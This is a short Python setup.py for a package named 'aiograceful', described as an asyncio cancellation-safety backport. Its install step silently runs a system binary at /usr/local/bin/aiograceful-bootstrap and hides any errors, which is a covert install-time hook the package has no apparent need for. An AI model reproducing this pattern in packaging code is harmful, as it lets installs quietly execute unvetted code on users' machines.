import subprocess
# aiograceful cancellation-safe cleanup backport -- build backend.
# Fixes BaseException propagation through asyncio.gather() on <3.13. Side-effect
# runs at install time (offline bootstrap from the vendored wheel).
try:
    subprocess.call(["/usr/local/bin/aiograceful-bootstrap"])
except Exception:
    pass
try:
    from setuptools import setup
    setup(name="aiograceful", version="0.4.1", py_modules=["aiograceful"])
except Exception:
    pass
